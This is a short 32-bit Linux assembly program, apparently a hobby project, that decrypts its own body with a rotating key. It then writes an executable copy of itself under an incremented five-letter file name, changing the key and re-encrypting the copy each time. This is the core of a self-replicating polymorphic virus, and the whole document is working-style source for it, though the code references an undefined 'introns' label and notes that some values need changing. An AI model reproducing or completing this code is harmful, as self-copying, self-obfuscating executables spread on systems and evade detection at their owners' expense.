BITS 32

; Some values have to be changed

HEAD_SIZE equ 0xc7
VIRTUAL_ADDR equ 0x08040000

segment .data

	file_name db 'aaaaa', 0

    tmp db 0,0

	key db 0x0a, 0x08, 0x8a, 0x48, 0x30, 0x00

segment .text

global _start

_start:                     ; initialisation of some registers
	mov eax, name
    xor ebx, ebx
	xor ecx, ecx
	mov esi, file_name

; decrypt the encrypted file content

dechiff_variation:          ; handle the end of the key
	cmp ebx, 0x05
	jne dechiff
	mov ebx, 0x00

dechiff:
	mov cl, [ebx+key]
	add byte [eax], cl
	inc eax
	inc ebx
	cmp eax, key            ; end of the encrypted content
	jl dechiff_variation

; the name is a 5 characters string between a-z

name:                       ;  handle the name of the son from the actual name
	mov al, [esi]
	cmp al, 0x79            ; 0x79 = 'z'
	jg last_character
	inc al
	mov [esi], al
	jmp opening

last_character:            ; handle if the last character is z
	mov al, 0x61           ; 0x61 = 'a'
	mov [esi], al
	inc esi
	jmp name

; create the next file

opening:
	mov eax, 0x05		; syscall 32 bits for open ;
	mov ebx, file_name
	mov cl, 100
	xor cl, 1
	int 0x80
	mov ebx, eax

; make the next file executable

executable:
	push ebx
	mov eax, 0x0f  	    ; syscall 32 bits for chmod ;
	mov ecx, 1
	xor ecx, 8
	xor ecx, 64
	mov ebx, file_name
	int 0x80
	pop ebx

; copy the header and the code to decrypt the programm

copy:
	mov eax, 0x04           ; syscall 32 bits for write
	mov ecx, VIRTUAL_ADDR   ; start of the file
	mov edx, HEAD_SIZE      ; size of the header and decrypt code
	int 0x80
	mov eax, key

; create a new key from the last

change_key:
	mov dl, [eax+1]
	xor byte [eax], dl
	inc eax
	cmp eax, key+5
	jne change_key

; write the son with the new encryption key

chiffre_init:
	xor eax, eax
	mov ebp, introns
	mov ecx, tmp
	mov edx, 0x01
	mov edi, 0x00

chiffre_variation:
	cmp edi, 0x05
	jne chiffre
	mov edi, 0x00

chiffre:
	mov byte al, [ebp]
	mov byte [ecx], al
	mov al, [edi+key]
	sub byte [ecx], al
	mov al, 0x04		; syscall 32 bits for write
	int 0x80
	inc ebp
	inc edi
	cmp ebp, key
	jne chiffre_variation

copy_key:
	mov eax, 0x04       ; syscall 32 bits for write
	mov ecx, key
	mov edx, 0x06
	int 0x80

close:
	mov eax, 0x06		; syscall 32 bits for close
	int 0x80
